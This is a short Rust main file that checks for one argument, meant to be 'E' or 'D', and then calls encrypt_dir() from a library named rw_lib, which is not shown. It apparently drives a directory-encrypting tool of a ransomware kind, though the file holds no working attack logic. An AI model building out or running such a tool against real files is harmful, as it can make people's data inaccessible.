#![allow(unused)]

use std::env;
use std::io::{Error, ErrorKind};
use rw_lib::*;

fn main() {
    println!("main");

    /*
        Check argv: "E" or "D"
     */
    let args: Vec<_> = env::args().collect();

    if args.len() != 2 {
        panic!("Usage: cargo run argv[1].");
    }

    rw_lib::encrypt_dir();

}
